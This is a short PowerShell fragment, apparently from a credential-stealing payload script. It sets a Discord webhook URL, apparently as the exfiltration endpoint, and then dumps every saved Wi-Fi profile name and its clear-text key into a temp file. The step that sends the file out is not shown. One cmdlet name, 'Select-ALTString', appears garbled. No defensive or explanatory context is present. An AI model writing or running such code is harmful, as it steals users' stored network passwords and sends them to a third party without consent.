  $url="https://discord.com/api/webhooks/1263874977925431530/uxw39bYUI6WnLGRo0Q03vv1kiEISICy3XjCrYjSAKNriLBIyWJOiRri71yZ3ULzTUPer" ;
...
(netsh wlan show profiles) | Select-ALTString "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | out-file "$env:temp\WIFI-$namepc.txt";
